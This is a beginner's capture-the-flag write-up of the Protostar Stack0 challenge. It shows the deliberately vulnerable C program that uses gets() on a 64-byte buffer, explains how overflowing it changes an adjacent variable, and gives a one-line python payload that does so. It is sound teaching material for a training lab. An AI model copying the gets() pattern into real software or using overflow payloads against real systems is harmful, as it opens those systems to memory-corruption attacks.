---
title: Protostar - Stack 0
date: 2024-02-14 09:38:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack0]
---

## Conquering Stack0 at Protostar Machine

Greetings , Hackers!. Today, we will start our journey to conquer the [Stack0](https://exploit.education/protostar/stack-zero/) challenge on the [Protostar](https://exploit.education/protostar) machine.

This challenge is considered very simple, requiring us to perform a stack overflow and override the next value in the buffer with any desired value.

### **Challenge Overview**
- **Challenge Name:** [Stack0](https://exploit.education/protostar/stack-zero/)
- **Machine:** [Protostar](https://exploit.education/protostar)

### Step 1: Setup Machine

1. Download the Protostar machine.
2. Install it using your favorite hypervisor, personally i use qemu and virt-manager.
3. Boot the machine and log in with the credentials: Username - `user`, Password - `user`.
4. Check the machine's IP address using the `ip addr` command.

![Checking IP address of Protostar](/assets/img/protostar/ip-addr.png)

5. Connect to the machine using SSH.

![SSH to Protostar](/assets/img/protostar/ssh.png)

### Step 2: Analyze Source Code

Let's examine the source code to understand the vulnerability.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("You have changed the 'modified' variable.\n");
  } else {
      printf("Try again?\n");
  }
}
```

the code is using `gets` function to receive input , the function is vulnerable to buffer-overflow as we can check manual page for `gets` by `man` command

```sh
man gets
```

Then Check Bugs Section ..

output:

![Bugs in gets](/assets/img/protostar/man-gets.png)

Oh .. We Can Overflow the buffer to modify `modified` variable ?
- Stack Layout Like this

```code
++++++++++++
+ stack    +
++++++++++++
+ buffer   +
+ modified +
++++++++++++
```
- so when we write more than 64 char to buffer then we will modify the `modified` variable !

### Step 3: Modify The Variable

```sh
python -c 'print("A"*65)' | /opt/protostar/bin/stack0
```

![Modify](/assets/img/protostar/stack0-modify.png)

Looks like it was solved , it was a very simple challenge.
